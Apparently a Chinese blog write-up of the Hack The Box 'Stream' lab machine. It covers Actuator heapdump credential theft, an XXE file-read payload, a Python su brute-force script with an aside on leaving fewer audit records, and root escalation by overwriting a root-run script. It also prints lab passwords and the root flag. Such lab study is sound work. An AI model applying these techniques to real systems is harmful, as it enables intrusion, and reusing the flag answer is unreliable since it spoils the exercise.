---
title: "HTB Stream：Actuator Heapdump、AIDX XXE 与 ClickHouse 提权"
date: 2026-11-12
categories: ["网络攻防"]
tags: ["HTB", "靶场", "Linux提权", "XXE", "ClickHouse", "Spring Boot", "Kopia"]
description: "HTB Stream（Linux）实战：heapdump 泄露数据库凭据、XXE 读配置进 SSH，最后靠备份里的口令和 root 定时器提权"
draft: false
password: true
---

Stream 是一台机场数据链路主题的 Linux 机器：表面只有三个端口，实际上叠了 Spring Boot、FastAPI 摄入服务、Kafka、ClickHouse 四个组件，每一层泄漏的凭据喂给下一层，最后用一个以 root 身份运行的 DLQ 定时器收尾。

| 项目 | 内容 |
| --- | --- |
| 目标 | 10.129.205.228（Stream） |
| 系统 | Linux / Medium |
| 入口 | Spring Boot Actuator heapdump |
| 关键点 | heapdump 凭据、XXE 异步回读、Kopia 备份、root 定时器劫持 |

## 0. 侦察

全端口扫描（`-p-`）只发现 22、80、8081 三个端口；下面是对这三个端口做的服务识别：

```bash
nmap -Pn -p 22,80,8081 -sV -sC --version-light 10.129.205.228
```

![1](../../stream/01-nmap.png)

- `80`：nginx，根路径 301 到 `http://api.htb-airport.htb/`
- `8081`：Uvicorn（FastAPI），即 AIDX 航班数据摄入 API

nginx 按 `Host` 分流，两个虚拟主机：

```bash
curl -s http://10.129.205.228/ -H 'Host: api.htb-airport.htb'
curl -s http://10.129.205.228/ -H 'Host: db.htb-airport.htb'
```

![2](../../stream/02-vhost-actuator.png)

`api` 是一个 Spring Boot 网关（`terminal-edge-gateway`），`/actuator` 只暴露了一个端点：`heapdump`。`db` 返回 4 字节的 `Ok.`，是 ClickHouse 的 HTTP 接口（默认 8123，被反代到 80）。

## 1. Spring Boot heapdump 泄露 ClickHouse 凭据

直接把 45MB 的堆转储拉下来：

```bash
curl -s -H 'Host: api.htb-airport.htb' \
  http://10.129.205.228/actuator/heapdump -o heap.bin
```

heap 里以明文字符串保存着数据源配置。用 `strings` 粗筛就能看到 ClickHouse 用户：

```bash
strings -n 6 heap.bin | grep -iE 'svc_events|CREATE USER|clickhouse' | sort -u
```

![3](../../stream/03-heapdump.png)

拿到 `svc_events / Yl4aCgh4y2PnU`。堆里还留着初始化 SQL：

```sql
CREATE USER IF NOT EXISTS "SVC_EVENTS" SALT '...' HASH '...' ADMIN!
```

## 2. ClickHouse 侦察

用刚拿到的凭据连 ClickHouse 的 HTTP 接口：

```bash
CH='http://10.129.205.228/?user=svc_events&password=Yl4aCgh4y2PnU'
curl -s "$CH" -H 'Host: db.htb-airport.htb' --data-binary 'SELECT currentUser(), version()'
curl -s "$CH" -H 'Host: db.htb-airport.htb' --data-binary 'SHOW TABLES FROM partner_feed'
```

![4](../../stream/04-clickhouse.png)

库 `partner_feed` 里是一条完整的 AIDX 数据管道：

| 表 | 作用 |
| --- | --- |
| `flightleg_raw` | 原始 XML 落库 |
| `flightleg_raw_kafka` | Kafka 引擎表，消费 `aidx.flightleg.raw.v1` |
| `flightleg_raw_mv` | 物化视图 |
| `flightleg_json` | 解析后的规范化 JSON |
| `flightleg_json_kafka` / `_mv` | 输出到 `aidx.flightleg.json.v1` |

`svc_events` 只有 `partner_feed` 上的 SELECT/INSERT 权限，够读解析结果。

## 3. AIDX 摄入接口的 XXE

8081 的 FastAPI 文档（`/openapi.json`）只暴露一个 POST `/feeds/aidx`，要求 `application/xml`，并检查四个标签名是否出现：`IATA_AIDX_FlightLegNotifRQ`、`Originator`、`FlightLeg`、`LegIdentifier`。

摄入服务自己**不解析**，只是把原始字节丢进 Kafka；真正的解析在 worker 里，用的是 `lxml` 且开启了 `resolve_entities=True`、`no_network=False` —— 经典 XXE。

先定义外部实体读 `/etc/passwd`，并在 `Airline` 与 `RemarkFreeText` 两处引用：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<IATA_AIDX_FlightLegNotifRQ xmlns="http://www.iata.org/IATA/2007/00" Version="22.1" TimeStamp="2026-11-16T09:00:00Z" TransactionIdentifier="xxe-passwd-2">
  <Originator Code="XX"/>
  <FlightLeg><LegIdentifier>
    <Airline>&xxe;</Airline>
    <FlightNumber>1</FlightNumber>
    <DepartureAirport>A</DepartureAirport>
    <ArrivalAirport>B</ArrivalAirport>
    <OriginDate>2026-01-01</OriginDate>
  </LegIdentifier>
  <LegData><RemarkFreeText>&xxe;</RemarkFreeText></LegData></FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
```

```bash
curl -s -X POST http://10.129.205.228:8081/feeds/aidx \
  -H 'Content-Type: application/xml' --data-binary @xxe_passwd2.xml
```

![5](../../stream/05-xxe-post.png)

实体展开的结果会随解析后的 JSON 落进 `flightleg_json`，用 `transaction_id` 取回来：

```bash
curl -s "$CH" -H 'Host: db.htb-airport.htb' --data-binary \
  "SELECT event FROM partner_feed.flightleg_json WHERE transaction_id='xxe-passwd-2' FORMAT Vertical"
```

![6](../../stream/06-passwd.png)

`svc-infra` 与 `martin_cole` 两个交互用户确认存在。

把实体路径换成 Kafka 的 `server.properties`，就能拿到 SASL 明文口令：

```xml
<!ENTITY xxe SYSTEM "file:///opt/kafka_2.13-4.3.1/config/server.properties">
```

![7](../../stream/07-kafka-creds.png)

```text
user_svc_infra="Ny2hdpme$bwT3"
```

同一口令复用到 SSH：`svc-infra / Ny2hdpme$bwT3`。

## 4. SSH 进入，横向到 martin_cole

```bash
sshpass -p 'Ny2hdpme$bwT3' ssh svc-infra@10.129.205.228 'id; hostname; ls -la /home'
```

![8](../../stream/08-ssh-svcinfra.png)

`svc-infra` 没有 sudo 权限，`martin_cole` 的家目录是 `750`，读不到。机器上没有配置 `pam_faillock` / `pam_tally2`，可以放心爆破 `su`。

`su` 不接受管道输入，需要伪终端。这里有个很阴的坑：`printf "$pw" | script -qec "su ..."` 这种写法经常**假阴性**——密码在 `Password:` 提示符出现之前就写进了 pty，被会话层丢掉，看起来像“每个密码都不对”。正确做法是先等提示符，再写密码，用 `su` 的退出码判定成败（`-s /bin/true` 可以避免多起一个 shell，也少一条 exec 记录）：

```python
pid, fd = pty.fork()
if pid == 0:
    os.execvp("su", ["su", "-s", "/bin/true", "martin_cole"])
# 读 fd 直到出现 "Password:" 再 os.write(fd, pw + b"\n")
status = os.waitpid(pid, 0)[1]
ok = os.WIFEXITED(status) and os.WEXITSTATUS(status) == 0
```

词表用 rockyou，按词频顺序轮转分发（`split -n r/N`），命中：

```text
[+] martin_cole : tinkerbell
```

`tinkerbell` 在 rockyou 里排第 63 行——没想到这么靠前，但它不在最流行的“10k 通用弱口令”榜里，所以只跑通用榜单会漏掉。

> 这台机器的 `auditd + sysmon + laurel` 会把每次 `su` 的 exec 都记审计，单次失败约 2 秒，并发拉高后 IO 会先饱和，实测稳定吞吐只有 3–5 次/秒。别指望靠堆并发跑完整份 rockyou。

## 5. user flag

拿到密码后直接 SSH（比 `su` 更省事）：

```bash
sshpass -p tinkerbell ssh martin_cole@10.129.205.228 'id; hostname; cat ~/user.txt'
```

![9](../../stream/10-user-flag.png)

```text
c27cfc5739be454d3e7813328********
```

## 6. Kopia 备份里的 ClickHouse 管理员口令

`martin_cole` 的家目录里有一个 Kopia 仓库 `~/backups`，并且客户端配置已经连好：

```bash
kopia repository status
kopia snapshot list --all
```

![11](../../stream/11-kopia-status.png)

仓库里是 `ch-logs` 快照（ClickHouse 日志，快照 ID `kc43a7ec76aeac204b305df2b777304d1`）。恢复到 `/tmp` 后翻日志：

```bash
kopia snapshot restore kc43a7ec76aeac204b305df2b777304d1 /tmp/restore
grep -rniE 'ALTER USER|password' /tmp/restore | head
```

![12](../../stream/12-kopia-restore.png)

历史错误日志里留下了默认用户的改密语句（当时手滑少打了一个引号，整条查询作为语法错误被完整记进了 `clickhouse-server.err.log`）：

```sql
ALTER USER default IDENTIFIED BY 'N3v3rs33nD4T4
```

也就是 `default / N3v3rs33nD4T4`。它比 `svc_events` 权限大得多，有 `WRITE ON FILE`。

## 7. root：劫持以 root 运行的 DLQ 格式化器

机器上有一个每两分钟跑一次的 root 定时器：

```bash
systemctl cat aidx-dlq-drainer.service
cat /opt/ops/dlq_drainer.py
```

![13](../../stream/13-dlq-drainer.png)

关键几行：

```python
FORMATTER  = os.environ.get("AIDX_FORMATTER",
             "/var/lib/clickhouse/user_files/aidx_quarantine.py")
CH_PW_FILE = os.environ.get("CH_PW_FILE", "/etc/partner-sync/ch.pw")
...
p = subprocess.run(["python3", FORMATTER], input=raw, capture_output=True, check=False)
```

DLQ 里每条消息都会交给 ClickHouse `user_files` 目录下的 `aidx_quarantine.py`，由 **root** 执行。这个目录对普通用户（包括 `martin_cole`）不可读，但 `default` 用户可以通过 `file()` 表函数改写它——`svc_events` 试过，会直接报 `Not enough privileges ... WRITE ON FILE`。

payload 直接把 root flag 复制出来（保持单行，避免 `file()` 的行格式问题）：

```python
import os;os.system("cp /root/root.txt /tmp/root.txt && chmod 644 /tmp/root.txt");print("ok"+chr(9)+"ok"+chr(9)+"ok")
```

用 `default` 身份写进去：

```bash
CHD='http://10.129.205.228/?user=default&password=N3v3rs33nD4T4'
curl -s "$CHD" -H 'Host: db.htb-airport.htb' --data-binary @fmt_write.sql
```

![14](../../stream/14-write-formatter.png)

然后往 DLQ 里投一条消息：向摄入接口发一段“标签齐全但 XML 不合法”的 body，摄入层只做子串检查会放行，解析 worker 失败后自动送进 `aidx.flightleg.dlq.v1`：

```bash
printf '<IATA_AIDX_FlightLegNotifRQ><Originator/><FlightLeg><LegIdentifier></IATA_AIDX_FlightLegNotifRQ>' \
  | curl -s -X POST http://10.129.205.228:8081/feeds/aidx \
    -H 'Content-Type: application/xml' --data-binary @-
```

等定时器触发（≤2 分钟），root 执行我们写的 formatter：

```bash
cat /tmp/root.txt
```

![15](../../stream/15-root-flag.png)

```text
954f3b2d4a9244c40d09e8f2bb604415
```

## 8. 收尾：这台机器考什么

- **Actuator 的 heapdump 是凭据仓库**：内存里的数据源配置是明文，禁止暴露 `/actuator/heapdump`；
- **异步管道的 XXE 仍然可回读**：摄入侧不解析不代表安全，解析侧开了 DTD/实体就会把文件内容带进下游存储；
- **口令复用把 XXE 变成 SSH 入口**：Kafka SASL 与系统账号共用密码；
- **备份与日志同属敏感资产**：Kopia 里的历史 ClickHouse 错误日志泄露了管理员口令；
- **root 服务执行低权限可写目录里的脚本**是提权放大器：formatter 应该 root 所有、不可被数据库服务改写。

## 附录：踩过的坑

**坑 0 · 隧道丢包让 heapdump 变成马拉松。** 到 HTB 美国边缘节点 20% 丢包，TCP 模式的 OpenVPN 反复卡死。用 `curl -C -` 断点续传+后台重试才拉完 45MB；并发分段反而更容易把文件写坏（多个 curl 同时 append）。最终确认是链路问题后换了一个速度正常的窗口一次性重下。

**坑 1 · 全端口扫描漏掉 8081。** 第一次扫的时候链路抖动，`8081` 没出现在结果里；重扫才看到 Uvicorn。链路不稳时端口结论要复测。爆破期间 `22` 端口还出现过短暂 `Connection refused`（sshd 连接队列被打满），过一会儿自己恢复。

**坑 2 · `su` 的伪终端输入竞态。** 直接用 `script` 或往 pty 里先写密码，会在提示符出现之前被丢弃，导致**已知正确的密码也验证失败**——整轮爆破全是假阴性。必须先读提示符再写密码。

**坑 3 · 超时 kill 掉未完成的尝试。** 给每次尝试设死超时（比如 4 秒）时，高并发下 `su` 还没走完 PAM 就被 kill，那些密码其实没测过。要么放宽超时，要么统计 `SIGKILL` 次数，别把“超时”当“失败”。

**坑 4 · 提交接口 404。** `/feeds/aidx` 在 8081 的 FastAPI 上，不在 80 的 Spring Boot 虚拟主机上，路径对了还要端口对。

**坑 5 · ClickHouse `file()` 是追加写。** 用 `INSERT INTO FUNCTION file(...)` 覆盖 formatter 时，原内容还在，新内容追加在文件末尾。只要把 payload 写成合法单行、放在原脚本之后，执行时依然会跑到，但更干净的做法是先确认 `mode`（`w`/`a`）。
